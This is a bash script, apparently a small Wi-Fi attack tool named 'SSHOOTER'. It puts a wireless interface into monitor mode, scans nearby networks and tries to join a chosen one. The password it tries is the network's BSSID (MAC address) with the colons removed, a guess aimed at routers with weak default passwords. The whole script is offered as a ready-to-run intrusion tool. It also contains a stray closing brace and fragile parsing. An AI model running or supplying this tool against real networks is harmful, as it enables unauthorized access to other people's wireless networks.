#!/bin/bash

# Regular Colors
Black='\e[0;30m'        # Black
Red='\e[0;31m'          # Red
Green='\e[0;32m'        # Green
Yellow='\e[0;33m'       # Yellow
Blue='\e[0;34m'         # Blue
Purple='\e[0;35m'       # Purple
Cyan='\e[0;36m'         # Cyan
White='\e[0;37m'        # White

# Bold
BBlack='\e[1;30m'       # Black
BRed='\e[1;31m'         # Red
BGreen='\e[1;32m'       # Green
BYellow='\e[1;33m'      # Yellow
BBlue='\e[1;34m'        # Blue
BPurple='\e[1;35m'      # Purple
BCyan='\e[1;36m'        # Cyan
BWhite='\e[1;37m'       # White

# Default
DefaultColor='\e[39m'   # Default foreground color

# ASCII Art Tag
echo -e "

${BWhite}███████╗███████╗██╗  ██╗${BGreen} ██████╗  ██████╗ ${BWhite}████████╗███████╗██████╗ 
${BWhite}██╔════╝██╔════╝██║  ██║${BGreen}██╔═══██╗██╔═══██╗${BWhite}╚══██╔══╝██╔════╝██╔══██╗
${BWhite}███████╗███████╗███████║${BGreen}██║   ██║██║   ██║${BWhite}   ██║   █████╗  ██████╔╝
${BWhite}╚════██║╚════██║██╔══██║${BGreen}██║   ██║██║   ██║${BWhite}   ██║   ██╔══╝  ██╔══██╗
${BWhite}███████║███████║██║  ██║${BGreen}╚██████╔╝╚██████╔╝${BWhite}   ██║   ███████╗██║  ██║
${BWhite}╚══════╝╚══════╝╚═╝  ╚═╝${BGreen} ╚═════╝  ╚═════╝ ${BWhite}   ╚═╝   ╚══════╝╚═╝  ╚═╝
                                                                   
${DefaultColor}
"

# Function to list available network interfaces
list_network_interfaces() {
    echo "Available network interfaces:"
    echo

    # ASCII Art Table Header
    cat << 'END_ASCII'
 _______________________
| Num |    Interface    |
|-----|-----------------|
END_ASCII

    # List network interfaces using airmon-ng
    airmon-ng | awk '
    NR > 2 {
        num = NR - 2;
        interface = $2;
        printf "| %-3d | %-15s |\n", num, interface;
    }'
    echo " _______________________"
}

# Function to enable monitor mode on the selected interface
enable_monitor_mode() {
    local interface="$1"
    echo "Enabling monitor mode on interface $interface..."
    airmon-ng start "$interface"
}

# Function to scan Wi-Fi networks
scan_wifi_networks() {
    local interface="$1"
    echo "Scanning for Wi-Fi networks on interface $interface..."
    echo

    # ASCII Art Table Header
    cat << 'END_ASCII'
 ___________________________________________________________________________________________
| Num |            SSID            |           BSSID           | Signal |    Security       |
|-----|----------------------------|---------------------------|--------|-------------------|
END_ASCII

    # Scan for available networks using nmcli
    nmcli -f SSID,BSSID,SIGNAL,SECURITY dev wifi | awk '
    BEGIN { FS="  +"; OFS=" | " }
    {
        if (NR > 1) {  # Skip the header line
            num = NR - 1;
            ssid = $1;
            bssid = $2;
            signal = $3;
            security = $4;
            printf "| %-3d | %-26s | %-25s | %-6s | %-17s |\n", num, ssid, bssid, signal, security;
        }
    }'
    echo " ___________________________________________________________________________________________"
}
# Function to connect to a Wi-Fi network
connect_to_wifi() {
    local ssid="$1"
    local mac_address="$2"

    # Remove colons from MAC address to use as password
    local password="${mac_address//:/}"

    # Show the password
    echo "Using password (MAC without colons): $password"

    # Attempt to connect to the Wi-Fi network using nmcli
    nmcli device wifi connect "$ssid" password "$password" 2>/dev/null
    connection_status=$?

    if [ $connection_status -eq 0 ]; then
        echo "Connected successfully!"
    else
        echo "Failed to connect."
    fi

    return $connection_status
}

# Main function
main() {
    # List network interfaces and prompt user to choose one
    list_network_interfaces
    read -p "Choose a network interface number: " choice

    # Get the selected interface based on user choice
    local interface=$(airmon-ng | awk 'NR>2 {print $2}' | sed -n "${choice}p")

    # Validate the selected interface
    if [ -z "$interface" ]; then
        echo "Invalid interface selected. Exiting."
        exit 1
    fi

    # Enable monitor mode on the selected interface
    enable_monitor_mode "$interface"

    # Scan for Wi-Fi networks
    scan_wifi_networks "$interface"

    # Prompt user for network choice
    read -p "Choose a network number to connect: " choice
    local selected_network=$(awk -v choice="$choice" 'NR==choice+1 {print $1, $2}' <<< "$(nmcli -f SSID,BSSID dev wifi)")

    # Extract the SSID and BSSID
    ssid=$(echo "$selected_network" | awk '{print $1}')
    mac_address=$(echo "$selected_network" | awk '{print $2}')

    echo "Connecting to SSID: $ssid with BSSID: $mac_address"

    connect_to_wifi "$ssid" "$mac_address"
    connection_status=$?

    if [ $connection_status -ne 0 ]; then
        echo "Connection failed."
    fi


    echo -e "${BGreen}Created by: ${BRed}DCCXVII ${BBlue}(https://github.com/DCCXVII)${DefaultColor}"}

}

main